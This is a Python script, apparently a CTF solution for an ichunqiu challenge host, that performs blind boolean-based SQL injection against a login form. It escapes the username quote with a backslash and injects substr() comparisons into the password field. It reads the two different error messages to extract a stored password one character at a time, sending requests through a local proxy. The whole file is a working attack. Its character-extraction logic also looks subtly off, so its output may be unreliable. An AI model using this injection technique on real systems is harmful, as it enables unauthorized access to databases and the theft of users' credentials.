import requests

passwd = ''

def p(time):
    global passwd
    for i in range(32, 126):
        password = '||substr(password,{},1)>{} limit 0,1#'.format(str(time),hex(i))

        data = {
            "username": '\\',
            "password": password,
        }

        r = requests.post(
            "http://eci-2ze48axkg4358udlszzc.cloudeci1.ichunqiu.com/index.php",
            data=data,proxies={
                'http':'http://127.0.0.1:8080'
            })
        if '用户名或密码错误' in r.text:
            print('用户名或密码错误')
            print(str(hex(i)))
            passwd += str(hex(i))
            print(passwd)
            p(time+1)
            return
        if '密码错误' in r.text:
            print('密码错误')
            continue

p(1)
print(passwd)